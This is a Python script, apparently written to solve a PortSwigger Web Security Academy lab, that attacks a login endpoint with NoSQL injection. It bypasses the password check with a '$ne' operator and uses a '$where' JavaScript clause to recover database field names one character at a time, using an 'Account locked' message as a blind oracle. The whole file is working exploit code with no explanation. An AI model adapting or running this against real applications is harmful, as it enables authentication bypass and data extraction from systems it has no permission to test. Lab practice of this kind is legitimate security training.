import requests

url = "https://0ae700ca034aa036819b61b3002d0062.web-security-academy.net/login"

headers = {
    "Host": "0ae700ca034aa036819b61b3002d0062.web-security-academy.net",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Referer": "https://0ae700ca034aa036819b61b3002d0062.web-security-academy.net/login",
    "Content-Type": "application/json",
    "Origin": "https://0ae700ca034aa036819b61b3002d0062.web-security-academy.net",
    "Connection": "keep-alive",
    "Cookie": "session=7HWOHkj3DG6u8lN3m4yNbF7zz5AjAkgv",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Priority": "u=0"
}

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"

field_names = {}

for i in range(5): 
    field_name = ""

    for char_pos in range(20):
        for char in charset:
            payload = {
                "username": "carlos",
                "password": {"$ne": "invalid"},
                "$where": f"Object.keys(this)[{i}].match('^{field_name}{char}.*')"
            }

            response = requests.post(url, json=payload, headers=headers)

            if "Account locked" in response.text:
                field_name += char
                print(f"Field at index {i}: {field_name}")
                break
        else:
            break

    field_names[i] = field_name

print("\nDiscovered Fields:", field_names)
